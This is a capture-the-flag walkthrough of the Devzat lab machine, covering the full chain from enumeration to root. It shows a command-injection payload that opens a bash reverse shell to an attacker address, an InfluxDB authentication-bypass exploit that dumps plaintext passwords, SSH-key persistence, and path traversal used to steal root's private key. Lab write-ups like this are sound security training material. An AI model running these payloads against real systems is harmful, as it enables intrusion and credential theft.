# Devzat Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.118 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.118`.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://devzat.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=2/17%Time=620F17F2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Right off the bat we notice that there are two SSH servers running and one is on a non-standard port `8000`.

### Apache

Navigating to `http://10.10.11.118` redirects to `http://devzat.htb`, so we'll add that to our `/etc/hosts` file with `echo "10.10.11.118 devzat.htb" | sudo tee -a /etc/hosts`.

Trying some directory bruteforcing with `gobuster dir -u http://devzat.htb -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` finds nothing interesting:

```
/images               (Status: 301) [Size: 309] [--> http://devzat.htb/images/]
/assets               (Status: 301) [Size: 309] [--> http://devzat.htb/assets/]
/javascript           (Status: 301) [Size: 313] [--> http://devzat.htb/javascript/]
```

Let's follow the directions at the bottom of the site: `ssh -l william devzat.htb -p 8000`. We get a simple messaging interface. After sending some messages and the message `help` this comes up:

```
devbot: See available commands with /commands or see help with /help ⭐
```

Sending `/help` outputs:

```
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
```

Visiting the linked [GitHub repo](https://github.com/quackduck/devzat) shows a seemingly legitimate project.

Sending `/commands` outputs:

```
SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
```

After looking around, it seems like this is a legitimate service with no vulnerabilities.

### Virtual Hosts

[This page](https://www.thehacker.recipes/web/recon/virtual-host-fuzzing) has some good information about virtual host fuzzing.

To scan for virtual hosts we need to start our own local DNS server since the `/etc/hosts` doesn't support wildcards. We can use `dnsmasq`. Start it with `sudo systemctl start dnsmasq`. Then, edit the config file at `/etc/dnsmasq.conf` by adding `address=/devzat.htb/10.10.11.118` like so: `echo 'address=/devzat.htb/10.10.11.118' >> sudo /etc/dnsmasq.conf`. Finally, reload the `dnsmasq` service by running `sudo systemctl reload dnsmasq`.

* `gobuster` command: `gobuster vhost -u http://devzat.htb -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`. However, it is just full of HTTP code 302 responses, which in theory can be filtered with `-b 302`, but that didn't work for me.
* `ffuf` command: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devzat.htb -H "Host: FUZZ.devzat.htb" -fc 302` ([more command examples here](https://allabouttesting.org/top-25-example-usage-of-ffuf-web-fuzzer/)).

`ffuf` finds the `pets` subdomain:

```
pets                    [Status: 200, Size: 510, Words: 20, Lines: 21]
```

### Pets Virtual Host

This page contains a list of pets with 3 fields: name, species, and characteristics. There is also a button to delete items from the list. Additionally, we can add a pet by entering the name of the pet and selecting a species from a drop down list. Clicking the delete button shows a message saying `Not implemented, yet`.

Adding pets works as expected but after trying an SSTI (specifically, `{{7*7}}`), the only output added to the list is `exit status 1`. So, that is strange. We might have some sort of command injection.

Let's do directory bruteforcing with `ffuf`: `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://pets.devzat.htb/FUZZ -fs 510`.

`ffuf` results:

```
.git                    [Status: 301, Size: 41, Words: 3, Lines: 3]
build                   [Status: 301, Size: 42, Words: 3, Lines: 3]
css                     [Status: 301, Size: 40, Words: 3, Lines: 3]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
```

There is a git repo. We can download the git repo with `wget -r -np -R "index.html*" http://pets.devzat.htb/.git/`. Run `git checkout -- .` to restore the working directory since we only download the `.git/` folder, not the entire working directory.

### Pets Source Code

Looking at `git log` and comparing commits with `git diff` shows that nothing was changed much in previous commits. We didn't find anything useful in previous commits.

Looking at the `main.go` file we see a section that is probably vulnerable to a command injection:

```go
func loadCharacter(species string) string {
    cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
    stdoutStderr, err := cmd.CombinedOutput()
    if err != nil {
        return err.Error()
    }
    return string(stdoutStderr)
}
```

This function, `loadCharacter`, is called by `addPet`, which is called when a pet is added through the user interface. Thus, we can control the `species` variable in this function.

As you can see, POST requests go right to the `addPet` function:

```go
func petHandler(w http.ResponseWriter, r *http.Request) {
    // Dispatch by method
    if r.Method == http.MethodPost {
        addPet(w, r)
    } else if r.Method == http.MethodGet {
        getPets(w, r)

    } else {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
    }
    // TODO: Add Update and Delete
}
```

In the `handleRequest` we discover that pets are added by POSTing the data to `/api/pet`. We could have also found this out using our browser's developer tools and monitoring the network requests.

## Foothold

Let's try a command injection using curl since the website's interface only lets us select species from a drop down. Our command injection payload is `dog;bash -i >& /dev/tcp/10.10.14.25/17344 0>&1`. We need to specify `dog` to finish off the `cat` command since we only control the command input after `cat characteristics/[OUR INPUT]`. We are using a simple bash reverse shell ([more reverse shell options here](https://www.revshells.com/)).

We can encode our payload as base64 so we don't have to deal with formatting issues: `echo -n "bash -i >& /dev/tcp/10.10.14.25/17344 0>&1" | base64`: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS8xNzM0NCAwPiYx`. Now, our payload is `dog;echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS8xNzM0NCAwPiYx' | base64 -d | bash`

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"name":"a","species":"dog;echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS8xNzM0NCAwPiYx' | base64 -d | bash"}' \
  http://pets.devzat.htb/api/pet
```

Start a listener with netcat with `nc -nvlp 17344` or use `pwncat`. This gives us a reverse shell connection to the user `patrick`. We can get persistance with `run implant.authorized_key key=/home/kali/.ssh/id_rsa` in `pwncat`. Now, we can connect with `ssh -i /home/kali/.ssh/id_rsa patrick@devzat.htb`.

There is no `user.txt` in `patrick`'s home directory. However, `cat /etc/passwd` shows another user `catherine` with uid `1001`.

## Lateral Movement

Let's upload LinPEAS with `upload linpeas.sh` and then run it with `bash linpeas.sh`.

Under the "Active Ports" section we see two unknown ports with services running locally: `8086` and `8443`.

```
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                  
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      868/./petshop       
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      872/./devchat
```

We can forward these to our attacker machine and investigate them using `nmap`. Let's first forward them using `SSH`: `ssh -i /home/kali/.ssh/id_rsa -L 8443:localhost:8443 -L 8086:localhost:8086 patrick@devzat.htb`.

Let's scan with `nmap`: `nmap -sC -sV  -p8443,8086 localhost`:

```
PORT     STATE SERVICE VERSION
8086/tcp open  http    InfluxDB http admin 1.7.5
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8443/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  256 66:61:73:b4:a2:9c:b1:b7:a9:81:7a:6e:1d:5d:fc:ec (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%I=7%D=2/18%Time=620F2EF9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");

```

Looks like port `8443` is `devzat` from before. Connecting with `ssh -l william localhost -p 8443` shows that it is. So, we can ignore that. Thus, our port forwards only needs to contain port `8086`: `ssh -i /home/kali/.ssh/id_rsa -L 8086:localhost:8086 patrick@devzat.htb`.

### InfluxDB

Port `8086` is much more interesting. It contains "InfluxDB http admin 1.7.5". However, navigating to `http://localhost:8086/` just shows `404 page not found`.

Searching "InfluxDB http admin 1.7.5" online finds the [HackTricks page](https://book.hacktricks.xyz/pentesting/8086-pentesting-influxdb) on it, which is really great. We learn that InfluxDB is "an open-source time series database (TSDB) developed by the company InfluxData. A time series database (TSDB) is a software system that is optimized for storing and serving time series through associated pairs of time(s) and value(s)."

The second result when searching "InfluxDB http admin 1.7.5" is [LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933). According to the repo: "InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret). Exploit check if server is vulnerable, then it tries to get a remote query shell. It has built in a username bruteforce service."

Let's try to use this exploit since the target is running a vulnerable version of InfluxDB.

```
git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
cd InfluxDB-Exploit-CVE-2019-20933
python3 -m venv env
source env/bin/activate
pip install -r requirements.txt
python __main__.py
```

Running the exploit:

```
Host (default: localhost): 
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): 

Bruteforcing usernames ...
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal

.quit to exit
[admin@127.0.0.1] Database: devzat

Starting InfluxDB shell - .back to go back
```

Now, we have an InfluxDB so let's try to list the tables. Searching online for how to do this reveals that we need to run the `SHOW MEASUREMENTS` command. You can learn more about InfluxDB queries [on this page](https://docs.influxdata.com/influxdb/v1.8/query_language/explore-data/#the-basic-select-statement).

```
[admin@127.0.0.1/devzat] $ SHOW MEASUREMENTS
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Now, we can dump all the fields from the `users` measurement:

```
[admin@127.0.0.1/devzat] $ select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

### `catherine` User

Now, we have credentials for `catherine` (`woBeeYareedahc7Oogeephies7Aiseci`), which will hopefully be the same as the user account `catherine` on the system.

Trying to simply ssh to the account with `ssh catherine@devzat.htb` outputs `Permission denied (publickey)`. So, it looks like password based ssh login is disabled.

However, since we are already signed in as `patrick`, we can `su catherine` and enter the password `woBeeYareedahc7Oogeephies7Aiseci`, which works.

We can now get the `user.txt` flag with `cat /home/catherine/user.txt`.

We can gain persistance by adding our public key to `catherine`'s `~/.ssh/authorized_keys` file: `echo [PUBLIC KEY HERE] >> ~/.ssh/authorized_keys`. Now, we can connect with `ssh -i /home/kali/.ssh/id_rsa catherine@devzat.htb`.

We can use this command to find files owned by `catherine` or that are world writable (from [Weird Location/Owned files - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#weird-location-owned-files)): `find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null`:

```
/snap/core18/2128/tmp
/snap/core18/2128/var/tmp
/snap/core18/2074/tmp
/snap/core18/2074/var/tmp
/dev/mqueue
/dev/shm
/home/catherine
/tmp
/tmp/test.txt
/tmp/tmux-1001
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/linpeas.sh
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.XIM-unix
/var/backups/devzat-main.zip
/var/backups/devzat-dev.zip
/var/crash
/var/tmp
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/units
/run/user/1001/inaccessible
/run/screen
/run/lock
```

These same results will appear when running LinPEAS under the header "Interesting writable files owned by me or writable by everyone (not in Home) (max 500)."

The files `/var/backups/devzat-main.zip` and `/var/backups/devzat-dev.zip` are interesting. Maybe the `devzat` service is exploitable after all. We can download them easily using `pwncat`'s download command.

### Devzat Backups

We exact the backups and then find the difference between them using `diff dev main`:

```
diff '--color=auto' dev/allusers.json main/allusers.json
1c1,3
< {}
---
> {
>    "eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3": "\u001b[38;5;214mtest\u001b[39m"
> }
diff '--color=auto' dev/commands.go main/commands.go
4d3
<       "bufio"
6,7d4
<       "os"
<       "path/filepath"
40d36
<               file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}                                                               
42,101c38
<       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}                                                                                             
< }
< 
< func fileCommand(u *user, args []string) {
<       if len(args) < 1 {
<               u.system("Please provide file to print and the password")
<               return
<       }
< 
<       if len(args) < 2 {
<               u.system("You need to provide the correct password to use this function")
<               return
<       }
< 
<       path := args[0]
<       pass := args[1]
< 
<       // Check my secure password
<       if pass != "CeilingCatStillAThingIn2021?" {
<               u.system("You did provide the wrong password")
<               return
<       }
< 
<       // Get CWD
<       cwd, err := os.Getwd()
<       if err != nil {
<               u.system(err.Error())
<       }
< 
<       // Construct path to print
<       printPath := filepath.Join(cwd, path)
< 
<       // Check if file exists
<       if _, err := os.Stat(printPath); err == nil {
<               // exists, print
<               file, err := os.Open(printPath)
<               if err != nil {
<                       u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))                                                                                      
<                       return
<               }
<               defer file.Close()
< 
<               scanner := bufio.NewScanner(file)
<               for scanner.Scan() {
<                       u.system(scanner.Text())
<               }
< 
<               if err := scanner.Err(); err != nil {
<                       u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))                                                                                     
<               }
< 
<               return
< 
<       } else if os.IsNotExist(err) {
<               // does not exist, print error
<               u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
<               return
<       }
<       // bokred?
<       u.system("Something went badly wrong.")
---
>       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}    
diff '--color=auto' dev/devchat.go main/devchat.go
27c27
<       port = 8443
---
>       port = 8000
114c114
<               fmt.Sprintf("127.0.0.1:%d", port),
---
>               fmt.Sprintf(":%d", port),
Only in dev: testfile.txt
```

At the bottom we see that the developer instance of `devzat` is running on port 8443 while the main version that we could access before is running on port 8000.

It looks like the main difference is that the development version has a `file` command with the description "Paste a files content directly to chat [alpha]".

We will need to provide a password to use this command, which is in plain text in the code: `CeilingCatStillAThingIn2021?`.

### Getting `root`

Let's connect to the development version of `devzat` with `ssh -l william localhost -p 8443`:

```
william: /file
[SYSTEM] Please provide file to print and the password
william: /file /root/root.txt
[SYSTEM] You need to provide the correct password to use this function
william: /file /root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
william: /file ../root.txt CeilingCatStillAThingIn2021?
```

Running `/file ../root.txt CeilingCatStillAThingIn2021?` returns the root flag.

We can get `root`'s private key with `/file ../.ssh/id_rsa CeilingCatStillAThingIn2021?`. Now, we just paste that into a file, change the permissions with `chmod 600 devzat_root_key`, and ssh to the machine as root with `ssh -i devzat_root_key root@devzat.htb`. Finally, we have a root shell.
